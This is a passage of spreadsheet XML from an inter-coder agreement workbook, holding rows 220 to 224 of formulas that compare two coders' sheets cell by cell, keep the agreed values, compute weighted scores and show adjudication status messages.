        <f>IF(AND(Coder1!AG220&amp;""&lt;&gt;"",Coder1!AG220&amp;""=Coder2!AG220&amp;""),Coder1!AG220,"")</f>
        <v/>
      </c>
      <c r="AH220" s="14">
        <f>IF(AND(Coder1!AH220&amp;""&lt;&gt;"",Coder1!AH220&amp;""=Coder2!AH220&amp;""),Coder1!AH220,"")</f>
        <v/>
      </c>
      <c r="AI220" s="11">
        <f>IF(COUNT(E220:L220)=0,"",SUM(E220:L220))</f>
        <v/>
      </c>
      <c r="AJ220" s="11">
        <f>IF(AI220="","",N(E220)*3+N(F220)*2+N(G220)*2+N(H220)*2+N(I220)*2+N(J220)*3+N(K220)*3+N(L220)*3)</f>
        <v/>
      </c>
      <c r="AK220" s="11">
        <f>IF(AI220="","",COUNTIF(N220:AG220,1))</f>
        <v/>
      </c>
      <c r="AL220" s="11">
        <f>IF(OR(AJ220="",AJ220=0),"",ROUND(100*(AJ220-AK220)/AJ220,1))</f>
        <v/>
      </c>
      <c r="AM220" s="11">
        <f>IF(AND(Coder1!AN220=1,Coder2!AN220=1),IF(COUNTBLANK(E220:AH220)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN220" s="11">
        <f>IF(AND(Coder1!AN220=1,Coder2!AN220=1),IF(SUMPRODUCT(--(Coder1!E220:AH220&amp;""&lt;&gt;Coder2!E220:AH220&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO220" s="11" t="n"/>
    </row>
    <row r="221">
      <c r="A221" s="11">
        <f>Coder1!A221</f>
        <v/>
      </c>
      <c r="B221" s="11">
        <f>Coder1!B221</f>
        <v/>
      </c>
      <c r="C221" s="11">
        <f>Coder1!C221</f>
        <v/>
      </c>
      <c r="D221" s="11">
        <f>Coder1!D221</f>
        <v/>
      </c>
      <c r="E221" s="14">
        <f>IF(AND(Coder1!E221&amp;""&lt;&gt;"",Coder1!E221&amp;""=Coder2!E221&amp;""),Coder1!E221,"")</f>
        <v/>
      </c>
      <c r="F221" s="14">
        <f>IF(AND(Coder1!F221&amp;""&lt;&gt;"",Coder1!F221&amp;""=Coder2!F221&amp;""),Coder1!F221,"")</f>
        <v/>
      </c>
      <c r="G221" s="14">
        <f>IF(AND(Coder1!G221&amp;""&lt;&gt;"",Coder1!G221&amp;""=Coder2!G221&amp;""),Coder1!G221,"")</f>
        <v/>
      </c>
      <c r="H221" s="14">
        <f>IF(AND(Coder1!H221&amp;""&lt;&gt;"",Coder1!H221&amp;""=Coder2!H221&amp;""),Coder1!H221,"")</f>
        <v/>
      </c>
      <c r="I221" s="14">
        <f>IF(AND(Coder1!I221&amp;""&lt;&gt;"",Coder1!I221&amp;""=Coder2!I221&amp;""),Coder1!I221,"")</f>
        <v/>
      </c>
      <c r="J221" s="14">
        <f>IF(AND(Coder1!J221&amp;""&lt;&gt;"",Coder1!J221&amp;""=Coder2!J221&amp;""),Coder1!J221,"")</f>
        <v/>
      </c>
      <c r="K221" s="14">
        <f>IF(AND(Coder1!K221&amp;""&lt;&gt;"",Coder1!K221&amp;""=Coder2!K221&amp;""),Coder1!K221,"")</f>
        <v/>
      </c>
      <c r="L221" s="14">
        <f>IF(AND(Coder1!L221&amp;""&lt;&gt;"",Coder1!L221&amp;""=Coder2!L221&amp;""),Coder1!L221,"")</f>
        <v/>
      </c>
      <c r="M221" s="14">
        <f>IF(AND(Coder1!M221&amp;""&lt;&gt;"",Coder1!M221&amp;""=Coder2!M221&amp;""),Coder1!M221,"")</f>
        <v/>
      </c>
      <c r="N221" s="14">
        <f>IF(AND(Coder1!N221&amp;""&lt;&gt;"",Coder1!N221&amp;""=Coder2!N221&amp;""),Coder1!N221,"")</f>
        <v/>
      </c>
      <c r="O221" s="14">
        <f>IF(AND(Coder1!O221&amp;""&lt;&gt;"",Coder1!O221&amp;""=Coder2!O221&amp;""),Coder1!O221,"")</f>
        <v/>
      </c>
      <c r="P221" s="14">
        <f>IF(AND(Coder1!P221&amp;""&lt;&gt;"",Coder1!P221&amp;""=Coder2!P221&amp;""),Coder1!P221,"")</f>
        <v/>
      </c>
      <c r="Q221" s="14">
        <f>IF(AND(Coder1!Q221&amp;""&lt;&gt;"",Coder1!Q221&amp;""=Coder2!Q221&amp;""),Coder1!Q221,"")</f>
        <v/>
      </c>
      <c r="R221" s="14">
        <f>IF(AND(Coder1!R221&amp;""&lt;&gt;"",Coder1!R221&amp;""=Coder2!R221&amp;""),Coder1!R221,"")</f>
        <v/>
      </c>
      <c r="S221" s="14">
        <f>IF(AND(Coder1!S221&amp;""&lt;&gt;"",Coder1!S221&amp;""=Coder2!S221&amp;""),Coder1!S221,"")</f>
        <v/>
      </c>
      <c r="T221" s="14">
        <f>IF(AND(Coder1!T221&amp;""&lt;&gt;"",Coder1!T221&amp;""=Coder2!T221&amp;""),Coder1!T221,"")</f>
        <v/>
      </c>
      <c r="U221" s="14">
        <f>IF(AND(Coder1!U221&amp;""&lt;&gt;"",Coder1!U221&amp;""=Coder2!U221&amp;""),Coder1!U221,"")</f>
        <v/>
      </c>
      <c r="V221" s="14">
        <f>IF(AND(Coder1!V221&amp;""&lt;&gt;"",Coder1!V221&amp;""=Coder2!V221&amp;""),Coder1!V221,"")</f>
        <v/>
      </c>
      <c r="W221" s="14">
        <f>IF(AND(Coder1!W221&amp;""&lt;&gt;"",Coder1!W221&amp;""=Coder2!W221&amp;""),Coder1!W221,"")</f>
        <v/>
      </c>
      <c r="X221" s="14">
        <f>IF(AND(Coder1!X221&amp;""&lt;&gt;"",Coder1!X221&amp;""=Coder2!X221&amp;""),Coder1!X221,"")</f>
        <v/>
      </c>
      <c r="Y221" s="14">
        <f>IF(AND(Coder1!Y221&amp;""&lt;&gt;"",Coder1!Y221&amp;""=Coder2!Y221&amp;""),Coder1!Y221,"")</f>
        <v/>
      </c>
      <c r="Z221" s="14">
        <f>IF(AND(Coder1!Z221&amp;""&lt;&gt;"",Coder1!Z221&amp;""=Coder2!Z221&amp;""),Coder1!Z221,"")</f>
        <v/>
      </c>
      <c r="AA221" s="14">
        <f>IF(AND(Coder1!AA221&amp;""&lt;&gt;"",Coder1!AA221&amp;""=Coder2!AA221&amp;""),Coder1!AA221,"")</f>
        <v/>
      </c>
      <c r="AB221" s="14">
        <f>IF(AND(Coder1!AB221&amp;""&lt;&gt;"",Coder1!AB221&amp;""=Coder2!AB221&amp;""),Coder1!AB221,"")</f>
        <v/>
      </c>
      <c r="AC221" s="14">
        <f>IF(AND(Coder1!AC221&amp;""&lt;&gt;"",Coder1!AC221&amp;""=Coder2!AC221&amp;""),Coder1!AC221,"")</f>
        <v/>
      </c>
      <c r="AD221" s="14">
        <f>IF(AND(Coder1!AD221&amp;""&lt;&gt;"",Coder1!AD221&amp;""=Coder2!AD221&amp;""),Coder1!AD221,"")</f>
        <v/>
      </c>
      <c r="AE221" s="14">
        <f>IF(AND(Coder1!AE221&amp;""&lt;&gt;"",Coder1!AE221&amp;""=Coder2!AE221&amp;""),Coder1!AE221,"")</f>
        <v/>
      </c>
      <c r="AF221" s="14">
        <f>IF(AND(Coder1!AF221&amp;""&lt;&gt;"",Coder1!AF221&amp;""=Coder2!AF221&amp;""),Coder1!AF221,"")</f>
        <v/>
      </c>
      <c r="AG221" s="14">
        <f>IF(AND(Coder1!AG221&amp;""&lt;&gt;"",Coder1!AG221&amp;""=Coder2!AG221&amp;""),Coder1!AG221,"")</f>
        <v/>
      </c>
      <c r="AH221" s="14">
        <f>IF(AND(Coder1!AH221&amp;""&lt;&gt;"",Coder1!AH221&amp;""=Coder2!AH221&amp;""),Coder1!AH221,"")</f>
        <v/>
      </c>
      <c r="AI221" s="11">
        <f>IF(COUNT(E221:L221)=0,"",SUM(E221:L221))</f>
        <v/>
      </c>
      <c r="AJ221" s="11">
        <f>IF(AI221="","",N(E221)*3+N(F221)*2+N(G221)*2+N(H221)*2+N(I221)*2+N(J221)*3+N(K221)*3+N(L221)*3)</f>
        <v/>
      </c>
      <c r="AK221" s="11">
        <f>IF(AI221="","",COUNTIF(N221:AG221,1))</f>
        <v/>
      </c>
      <c r="AL221" s="11">
        <f>IF(OR(AJ221="",AJ221=0),"",ROUND(100*(AJ221-AK221)/AJ221,1))</f>
        <v/>
      </c>
      <c r="AM221" s="11">
        <f>IF(AND(Coder1!AN221=1,Coder2!AN221=1),IF(COUNTBLANK(E221:AH221)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN221" s="11">
        <f>IF(AND(Coder1!AN221=1,Coder2!AN221=1),IF(SUMPRODUCT(--(Coder1!E221:AH221&amp;""&lt;&gt;Coder2!E221:AH221&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO221" s="11" t="n"/>
    </row>
    <row r="222">
      <c r="A222" s="11">
        <f>Coder1!A222</f>
        <v/>
      </c>
      <c r="B222" s="11">
        <f>Coder1!B222</f>
        <v/>
      </c>
      <c r="C222" s="11">
        <f>Coder1!C222</f>
        <v/>
      </c>
      <c r="D222" s="11">
        <f>Coder1!D222</f>
        <v/>
      </c>
      <c r="E222" s="14">
        <f>IF(AND(Coder1!E222&amp;""&lt;&gt;"",Coder1!E222&amp;""=Coder2!E222&amp;""),Coder1!E222,"")</f>
        <v/>
      </c>
      <c r="F222" s="14">
        <f>IF(AND(Coder1!F222&amp;""&lt;&gt;"",Coder1!F222&amp;""=Coder2!F222&amp;""),Coder1!F222,"")</f>
        <v/>
      </c>
      <c r="G222" s="14">
        <f>IF(AND(Coder1!G222&amp;""&lt;&gt;"",Coder1!G222&amp;""=Coder2!G222&amp;""),Coder1!G222,"")</f>
        <v/>
      </c>
      <c r="H222" s="14">
        <f>IF(AND(Coder1!H222&amp;""&lt;&gt;"",Coder1!H222&amp;""=Coder2!H222&amp;""),Coder1!H222,"")</f>
        <v/>
      </c>
      <c r="I222" s="14">
        <f>IF(AND(Coder1!I222&amp;""&lt;&gt;"",Coder1!I222&amp;""=Coder2!I222&amp;""),Coder1!I222,"")</f>
        <v/>
      </c>
      <c r="J222" s="14">
        <f>IF(AND(Coder1!J222&amp;""&lt;&gt;"",Coder1!J222&amp;""=Coder2!J222&amp;""),Coder1!J222,"")</f>
        <v/>
      </c>
      <c r="K222" s="14">
        <f>IF(AND(Coder1!K222&amp;""&lt;&gt;"",Coder1!K222&amp;""=Coder2!K222&amp;""),Coder1!K222,"")</f>
        <v/>
      </c>
      <c r="L222" s="14">
        <f>IF(AND(Coder1!L222&amp;""&lt;&gt;"",Coder1!L222&amp;""=Coder2!L222&amp;""),Coder1!L222,"")</f>
        <v/>
      </c>
      <c r="M222" s="14">
        <f>IF(AND(Coder1!M222&amp;""&lt;&gt;"",Coder1!M222&amp;""=Coder2!M222&amp;""),Coder1!M222,"")</f>
        <v/>
      </c>
      <c r="N222" s="14">
        <f>IF(AND(Coder1!N222&amp;""&lt;&gt;"",Coder1!N222&amp;""=Coder2!N222&amp;""),Coder1!N222,"")</f>
        <v/>
      </c>
      <c r="O222" s="14">
        <f>IF(AND(Coder1!O222&amp;""&lt;&gt;"",Coder1!O222&amp;""=Coder2!O222&amp;""),Coder1!O222,"")</f>
        <v/>
      </c>
      <c r="P222" s="14">
        <f>IF(AND(Coder1!P222&amp;""&lt;&gt;"",Coder1!P222&amp;""=Coder2!P222&amp;""),Coder1!P222,"")</f>
        <v/>
      </c>
      <c r="Q222" s="14">
        <f>IF(AND(Coder1!Q222&amp;""&lt;&gt;"",Coder1!Q222&amp;""=Coder2!Q222&amp;""),Coder1!Q222,"")</f>
        <v/>
      </c>
      <c r="R222" s="14">
        <f>IF(AND(Coder1!R222&amp;""&lt;&gt;"",Coder1!R222&amp;""=Coder2!R222&amp;""),Coder1!R222,"")</f>
        <v/>
      </c>
      <c r="S222" s="14">
        <f>IF(AND(Coder1!S222&amp;""&lt;&gt;"",Coder1!S222&amp;""=Coder2!S222&amp;""),Coder1!S222,"")</f>
        <v/>
      </c>
      <c r="T222" s="14">
        <f>IF(AND(Coder1!T222&amp;""&lt;&gt;"",Coder1!T222&amp;""=Coder2!T222&amp;""),Coder1!T222,"")</f>
        <v/>
      </c>
      <c r="U222" s="14">
        <f>IF(AND(Coder1!U222&amp;""&lt;&gt;"",Coder1!U222&amp;""=Coder2!U222&amp;""),Coder1!U222,"")</f>
        <v/>
      </c>
      <c r="V222" s="14">
        <f>IF(AND(Coder1!V222&amp;""&lt;&gt;"",Coder1!V222&amp;""=Coder2!V222&amp;""),Coder1!V222,"")</f>
        <v/>
      </c>
      <c r="W222" s="14">
        <f>IF(AND(Coder1!W222&amp;""&lt;&gt;"",Coder1!W222&amp;""=Coder2!W222&amp;""),Coder1!W222,"")</f>
        <v/>
      </c>
      <c r="X222" s="14">
        <f>IF(AND(Coder1!X222&amp;""&lt;&gt;"",Coder1!X222&amp;""=Coder2!X222&amp;""),Coder1!X222,"")</f>
        <v/>
      </c>
      <c r="Y222" s="14">
        <f>IF(AND(Coder1!Y222&amp;""&lt;&gt;"",Coder1!Y222&amp;""=Coder2!Y222&amp;""),Coder1!Y222,"")</f>
        <v/>
      </c>
      <c r="Z222" s="14">
        <f>IF(AND(Coder1!Z222&amp;""&lt;&gt;"",Coder1!Z222&amp;""=Coder2!Z222&amp;""),Coder1!Z222,"")</f>
        <v/>
      </c>
      <c r="AA222" s="14">
        <f>IF(AND(Coder1!AA222&amp;""&lt;&gt;"",Coder1!AA222&amp;""=Coder2!AA222&amp;""),Coder1!AA222,"")</f>
        <v/>
      </c>
      <c r="AB222" s="14">
        <f>IF(AND(Coder1!AB222&amp;""&lt;&gt;"",Coder1!AB222&amp;""=Coder2!AB222&amp;""),Coder1!AB222,"")</f>
        <v/>
      </c>
      <c r="AC222" s="14">
        <f>IF(AND(Coder1!AC222&amp;""&lt;&gt;"",Coder1!AC222&amp;""=Coder2!AC222&amp;""),Coder1!AC222,"")</f>
        <v/>
      </c>
      <c r="AD222" s="14">
        <f>IF(AND(Coder1!AD222&amp;""&lt;&gt;"",Coder1!AD222&amp;""=Coder2!AD222&amp;""),Coder1!AD222,"")</f>
        <v/>
      </c>
      <c r="AE222" s="14">
        <f>IF(AND(Coder1!AE222&amp;""&lt;&gt;"",Coder1!AE222&amp;""=Coder2!AE222&amp;""),Coder1!AE222,"")</f>
        <v/>
      </c>
      <c r="AF222" s="14">
        <f>IF(AND(Coder1!AF222&amp;""&lt;&gt;"",Coder1!AF222&amp;""=Coder2!AF222&amp;""),Coder1!AF222,"")</f>
        <v/>
      </c>
      <c r="AG222" s="14">
        <f>IF(AND(Coder1!AG222&amp;""&lt;&gt;"",Coder1!AG222&amp;""=Coder2!AG222&amp;""),Coder1!AG222,"")</f>
        <v/>
      </c>
      <c r="AH222" s="14">
        <f>IF(AND(Coder1!AH222&amp;""&lt;&gt;"",Coder1!AH222&amp;""=Coder2!AH222&amp;""),Coder1!AH222,"")</f>
        <v/>
      </c>
      <c r="AI222" s="11">
        <f>IF(COUNT(E222:L222)=0,"",SUM(E222:L222))</f>
        <v/>
      </c>
      <c r="AJ222" s="11">
        <f>IF(AI222="","",N(E222)*3+N(F222)*2+N(G222)*2+N(H222)*2+N(I222)*2+N(J222)*3+N(K222)*3+N(L222)*3)</f>
        <v/>
      </c>
      <c r="AK222" s="11">
        <f>IF(AI222="","",COUNTIF(N222:AG222,1))</f>
        <v/>
      </c>
      <c r="AL222" s="11">
        <f>IF(OR(AJ222="",AJ222=0),"",ROUND(100*(AJ222-AK222)/AJ222,1))</f>
        <v/>
      </c>
      <c r="AM222" s="11">
        <f>IF(AND(Coder1!AN222=1,Coder2!AN222=1),IF(COUNTBLANK(E222:AH222)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN222" s="11">
        <f>IF(AND(Coder1!AN222=1,Coder2!AN222=1),IF(SUMPRODUCT(--(Coder1!E222:AH222&amp;""&lt;&gt;Coder2!E222:AH222&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO222" s="11" t="n"/>
    </row>
    <row r="223">
      <c r="A223" s="11">
        <f>Coder1!A223</f>
        <v/>
      </c>
      <c r="B223" s="11">
        <f>Coder1!B223</f>
        <v/>
      </c>
      <c r="C223" s="11">
        <f>Coder1!C223</f>
        <v/>
      </c>
      <c r="D223" s="11">
        <f>Coder1!D223</f>
        <v/>
      </c>
      <c r="E223" s="14">
        <f>IF(AND(Coder1!E223&amp;""&lt;&gt;"",Coder1!E223&amp;""=Coder2!E223&amp;""),Coder1!E223,"")</f>
        <v/>
      </c>
      <c r="F223" s="14">
        <f>IF(AND(Coder1!F223&amp;""&lt;&gt;"",Coder1!F223&amp;""=Coder2!F223&amp;""),Coder1!F223,"")</f>
        <v/>
      </c>
      <c r="G223" s="14">
        <f>IF(AND(Coder1!G223&amp;""&lt;&gt;"",Coder1!G223&amp;""=Coder2!G223&amp;""),Coder1!G223,"")</f>
        <v/>
      </c>
      <c r="H223" s="14">
        <f>IF(AND(Coder1!H223&amp;""&lt;&gt;"",Coder1!H223&amp;""=Coder2!H223&amp;""),Coder1!H223,"")</f>
        <v/>
      </c>
      <c r="I223" s="14">
        <f>IF(AND(Coder1!I223&amp;""&lt;&gt;"",Coder1!I223&amp;""=Coder2!I223&amp;""),Coder1!I223,"")</f>
        <v/>
      </c>
      <c r="J223" s="14">
        <f>IF(AND(Coder1!J223&amp;""&lt;&gt;"",Coder1!J223&amp;""=Coder2!J223&amp;""),Coder1!J223,"")</f>
        <v/>
      </c>
      <c r="K223" s="14">
        <f>IF(AND(Coder1!K223&amp;""&lt;&gt;"",Coder1!K223&amp;""=Coder2!K223&amp;""),Coder1!K223,"")</f>
        <v/>
      </c>
      <c r="L223" s="14">
        <f>IF(AND(Coder1!L223&amp;""&lt;&gt;"",Coder1!L223&amp;""=Coder2!L223&amp;""),Coder1!L223,"")</f>
        <v/>
      </c>
      <c r="M223" s="14">
        <f>IF(AND(Coder1!M223&amp;""&lt;&gt;"",Coder1!M223&amp;""=Coder2!M223&amp;""),Coder1!M223,"")</f>
        <v/>
      </c>
      <c r="N223" s="14">
        <f>IF(AND(Coder1!N223&amp;""&lt;&gt;"",Coder1!N223&amp;""=Coder2!N223&amp;""),Coder1!N223,"")</f>
        <v/>
      </c>
      <c r="O223" s="14">
        <f>IF(AND(Coder1!O223&amp;""&lt;&gt;"",Coder1!O223&amp;""=Coder2!O223&amp;""),Coder1!O223,"")</f>
        <v/>
      </c>
      <c r="P223" s="14">
        <f>IF(AND(Coder1!P223&amp;""&lt;&gt;"",Coder1!P223&amp;""=Coder2!P223&amp;""),Coder1!P223,"")</f>
        <v/>
      </c>
      <c r="Q223" s="14">
        <f>IF(AND(Coder1!Q223&amp;""&lt;&gt;"",Coder1!Q223&amp;""=Coder2!Q223&amp;""),Coder1!Q223,"")</f>
        <v/>
      </c>
      <c r="R223" s="14">
        <f>IF(AND(Coder1!R223&amp;""&lt;&gt;"",Coder1!R223&amp;""=Coder2!R223&amp;""),Coder1!R223,"")</f>
        <v/>
      </c>
      <c r="S223" s="14">
        <f>IF(AND(Coder1!S223&amp;""&lt;&gt;"",Coder1!S223&amp;""=Coder2!S223&amp;""),Coder1!S223,"")</f>
        <v/>
      </c>
      <c r="T223" s="14">
        <f>IF(AND(Coder1!T223&amp;""&lt;&gt;"",Coder1!T223&amp;""=Coder2!T223&amp;""),Coder1!T223,"")</f>
        <v/>
      </c>
      <c r="U223" s="14">
        <f>IF(AND(Coder1!U223&amp;""&lt;&gt;"",Coder1!U223&amp;""=Coder2!U223&amp;""),Coder1!U223,"")</f>
        <v/>
      </c>
      <c r="V223" s="14">
        <f>IF(AND(Coder1!V223&amp;""&lt;&gt;"",Coder1!V223&amp;""=Coder2!V223&amp;""),Coder1!V223,"")</f>
        <v/>
      </c>
      <c r="W223" s="14">
        <f>IF(AND(Coder1!W223&amp;""&lt;&gt;"",Coder1!W223&amp;""=Coder2!W223&amp;""),Coder1!W223,"")</f>
        <v/>
      </c>
      <c r="X223" s="14">
        <f>IF(AND(Coder1!X223&amp;""&lt;&gt;"",Coder1!X223&amp;""=Coder2!X223&amp;""),Coder1!X223,"")</f>
        <v/>
      </c>
      <c r="Y223" s="14">
        <f>IF(AND(Coder1!Y223&amp;""&lt;&gt;"",Coder1!Y223&amp;""=Coder2!Y223&amp;""),Coder1!Y223,"")</f>
        <v/>
      </c>
      <c r="Z223" s="14">
        <f>IF(AND(Coder1!Z223&amp;""&lt;&gt;"",Coder1!Z223&amp;""=Coder2!Z223&amp;""),Coder1!Z223,"")</f>
        <v/>
      </c>
      <c r="AA223" s="14">
        <f>IF(AND(Coder1!AA223&amp;""&lt;&gt;"",Coder1!AA223&amp;""=Coder2!AA223&amp;""),Coder1!AA223,"")</f>
        <v/>
      </c>
      <c r="AB223" s="14">
        <f>IF(AND(Coder1!AB223&amp;""&lt;&gt;"",Coder1!AB223&amp;""=Coder2!AB223&amp;""),Coder1!AB223,"")</f>
        <v/>
      </c>
      <c r="AC223" s="14">
        <f>IF(AND(Coder1!AC223&amp;""&lt;&gt;"",Coder1!AC223&amp;""=Coder2!AC223&amp;""),Coder1!AC223,"")</f>
        <v/>
      </c>
      <c r="AD223" s="14">
        <f>IF(AND(Coder1!AD223&amp;""&lt;&gt;"",Coder1!AD223&amp;""=Coder2!AD223&amp;""),Coder1!AD223,"")</f>
        <v/>
      </c>
      <c r="AE223" s="14">
        <f>IF(AND(Coder1!AE223&amp;""&lt;&gt;"",Coder1!AE223&amp;""=Coder2!AE223&amp;""),Coder1!AE223,"")</f>
        <v/>
      </c>
      <c r="AF223" s="14">
        <f>IF(AND(Coder1!AF223&amp;""&lt;&gt;"",Coder1!AF223&amp;""=Coder2!AF223&amp;""),Coder1!AF223,"")</f>
        <v/>
      </c>
      <c r="AG223" s="14">
        <f>IF(AND(Coder1!AG223&amp;""&lt;&gt;"",Coder1!AG223&amp;""=Coder2!AG223&amp;""),Coder1!AG223,"")</f>
        <v/>
      </c>
      <c r="AH223" s="14">
        <f>IF(AND(Coder1!AH223&amp;""&lt;&gt;"",Coder1!AH223&amp;""=Coder2!AH223&amp;""),Coder1!AH223,"")</f>
        <v/>
      </c>
      <c r="AI223" s="11">
        <f>IF(COUNT(E223:L223)=0,"",SUM(E223:L223))</f>
        <v/>
      </c>
      <c r="AJ223" s="11">
        <f>IF(AI223="","",N(E223)*3+N(F223)*2+N(G223)*2+N(H223)*2+N(I223)*2+N(J223)*3+N(K223)*3+N(L223)*3)</f>
        <v/>
      </c>
      <c r="AK223" s="11">
        <f>IF(AI223="","",COUNTIF(N223:AG223,1))</f>
        <v/>
      </c>
      <c r="AL223" s="11">
        <f>IF(OR(AJ223="",AJ223=0),"",ROUND(100*(AJ223-AK223)/AJ223,1))</f>
        <v/>
      </c>
      <c r="AM223" s="11">
        <f>IF(AND(Coder1!AN223=1,Coder2!AN223=1),IF(COUNTBLANK(E223:AH223)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN223" s="11">
        <f>IF(AND(Coder1!AN223=1,Coder2!AN223=1),IF(SUMPRODUCT(--(Coder1!E223:AH223&amp;""&lt;&gt;Coder2!E223:AH223&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO223" s="11" t="n"/>
    </row>
    <row r="224">
      <c r="A224" s="11">
        <f>Coder1!A224</f>
        <v/>
      </c>
      <c r="B224" s="11">
        <f>Coder1!B224</f>
        <v/>
      </c>
      <c r="C224" s="11">
        <f>Coder1!C224</f>
        <v/>
      </c>
      <c r="D224" s="11">
        <f>Coder1!D224</f>
        <v/>
      </c>
      <c r="E224" s="14">
        <f>IF(AND(Coder1!E224&amp;""&lt;&gt;"",Coder1!E224&amp;""=Coder2!E224&amp;""),Coder1!E224,"")</f>
        <v/>
      </c>
      <c r="F224" s="14">
        <f>IF(AND(Coder1!F224&amp;""&lt;&gt;"",Coder1!F224&amp;""=Coder2!F224&amp;""),Coder1!F224,"")</f>
        <v/>
      </c>
      <c r="G224" s="14">
        <f>IF(AND(Coder1!G224&amp;""&lt;&gt;"",Coder1!G224&amp;""=Coder2!G224&amp;""),Coder1!G224,"")</f>
        <v/>
      </c>
      <c r="H224" s="14">
        <f>IF(AND(Coder1!H224&amp;""&lt;&gt;"",Coder1!H224&amp;""=Coder2!H224&amp;""),Coder1!H224,"")</f>
        <v/>
      </c>
      <c r="I224" s="14">
        <f>IF(AND(Coder1!I224&amp;""&lt;&gt;"",Coder1!I224&amp;""=Coder2!I224&amp;""),Coder1!I224,"")</f>
        <v/>
      </c>
      <c r="J224" s="14">
        <f>IF(AND(Coder1!J224&amp;""&lt;&gt;"",Coder1!J224&amp;""=Coder2!J224&amp;""),Coder1!J224,"")</f>
        <v/>
      </c>
      <c r="K224" s="14">
        <f>IF(AND(Coder1!K224&amp;""&lt;&gt;"",Coder1!K224&amp;""=Coder2!K224&amp;""),Coder1!K224,"")</f>
        <v/>
      </c>
      <c r="L224" s="14">
        <f>IF(AND(Coder1!L224&amp;""&lt;&gt;"",Coder1!L224&amp;""=Coder2!L224&amp;""),Coder1!L224,"")</f>
        <v/>
      </c>
      <c r="M224" s="14">
        <f>IF(AND(Coder1!M224&amp;""&lt;&gt;"",Coder1!M224&amp;""=Coder2!M224&amp;""),Coder1!M224,"")</f>
        <v/>
      </c>
      <c r="N224" s="14">
        <f>IF(AND(Coder1!N224&amp;""&lt;&gt;"",Coder1!N224&amp;""=Coder2!N224&amp;""),Coder1!N224,"")</f>
        <v/>
      </c>
      <c r="O224" s="14">
        <f>IF(AND(Coder1!O224&amp;""&lt;&gt;"",Coder1!O224&amp;""=Coder2!O224&amp;""),Coder1!O224,"")</f>
        <v/>
      </c>
      <c r="P224" s="14">
        <f>IF(AND(Coder1!P224&amp;""&lt;&gt;"",Coder1!P224&amp;""=Coder2!P224&amp;""),Coder1!P224,"")</f>
        <v/>
      </c>
      <c r="Q224" s="14">
        <f>IF(AND(Coder1!Q224&amp;""&lt;&gt;"",Coder1!Q224&amp;""=Coder2!Q224&amp;""),Coder1!Q224,"")</f>
        <v/>
      </c>
      <c r="R224" s="14">
        <f>IF(AND(Coder1!R224&amp;""&lt;&gt;"",Coder1!R224&amp;""=Coder2!R224&amp;""),Coder1!R224,"")</f>
        <v/>
      </c>
      <c r="S224" s="14">
        <f>IF(AND(Coder1!S224&amp;""&lt;&gt;"",Coder1!S224&amp;""=Coder2!S224&amp;""),Coder1!S224,"")</f>
        <v/>
      </c>
      <c r="T224" s="14">
        <f>IF(AND(Coder1!T224&amp;""&lt;&gt;"",Coder1!T224&amp;""=Coder2!T224&amp;""),Coder1!T224,"")</f>
        <v/>
      </c>
      <c r="U224" s="14">
        <f>IF(AND(Coder1!U224&amp;""&lt;&gt;"",Coder1!U224&amp;""=Coder2!U224&amp;""),Coder1!U224,"")</f>
        <v/>
      </c>
      <c r="V224" s="14">
        <f>IF(AND(Coder1!V224&amp;""&lt;&gt;"",Coder1!V224&amp;""=Coder2!V224&amp;""),Coder1!V224,"")</f>
        <v/>
      </c>
      <c r="W224" s="14">
        <f>IF(AND(Coder1!W224&amp;""&lt;&gt;"",Coder1!W224&amp;""=Coder2!W224&amp;""),Coder1!W224,"")</f>
        <v/>
      </c>
      <c r="X224" s="14">
        <f>IF(AND(Coder1!X224&amp;""&lt;&gt;"",Coder1!X224&amp;""=Coder2!X224&amp;""),Coder1!X224,"")</f>
        <v/>
      </c>
      <c r="Y224" s="14">
        <f>IF(AND(Coder1!Y224&amp;""&lt;&gt;"",Coder1!Y224&amp;""=Coder2!Y224&amp;""),Coder1!Y224,"")</f>
        <v/>
      </c>
      <c r="Z224" s="14">
        <f>IF(AND(Coder1!Z224&amp;""&lt;&gt;"",Coder1!Z224&amp;""=Coder2!Z224&amp;""),Coder1!Z224,"")</f>
        <v/>
      </c>
      <c r="AA224" s="14">
        <f>IF(AND(Coder1!AA224&amp;""&lt;&gt;"",Coder1!AA224&amp;""=Coder2!AA224&amp;""),Coder1!AA224,"")</f>
        <v/>
      </c>
      <c r="AB224" s="14">
        <f>IF(AND(Coder1!AB224&amp;""&lt;&gt;"",Coder1!AB224&amp;""=Coder2!AB224&amp;""),Coder1!AB224,"")</f>
        <v/>
      </c>
      <c r="AC224" s="14">
        <f>IF(AND(Coder1!AC224&amp;""&lt;&gt;"",Coder1!AC224&amp;""=Coder2!AC224&amp;""),Coder1!AC224,"")</f>
        <v/>
      </c>
      <c r="AD224" s="14">
        <f>IF(AND(Coder1!AD224&amp;""&lt;&gt;"",Coder1!AD224&amp;""=Coder2!AD224&amp;""),Coder1!AD224,"")</f>
        <v/>
      </c>
      <c r="AE224" s="14">
        <f>IF(AND(Coder1!AE224&amp;""&lt;&gt;"",Coder1!AE224&amp;""=Coder2!AE224&amp;""),Coder1!AE224,"")</f>
        <v/>
      </c>
      <c r="AF224" s="14">
        <f>IF(AND(Coder1!AF224&amp;""&lt;&gt;"",Coder1!AF224&amp;""=Coder2!AF224&amp;""),Coder1!AF224,"")</f>
        <v/>
      </c>
      <c r="AG224" s="14">
        <f>IF(AND(Coder1!AG224&amp;""&lt;&gt;"",Coder1!AG224&amp;""=Coder2!AG224&amp;""),Coder1!AG224,"")</f>
        <v/>
      </c>
      <c r="AH224" s="14">
        <f>IF(AND(Coder1!AH224&amp;""&lt;&gt;"",Coder1!AH224&amp;""=Coder2!AH224&amp;""),Coder1!AH224,"")</f>
        <v/>
      </c>
      <c r="AI224" s="11">
        <f>IF(COUNT(E224:L224)=0,"",SUM(E224:L224))</f>
        <v/>
      </c>
      <c r="AJ224" s="11">
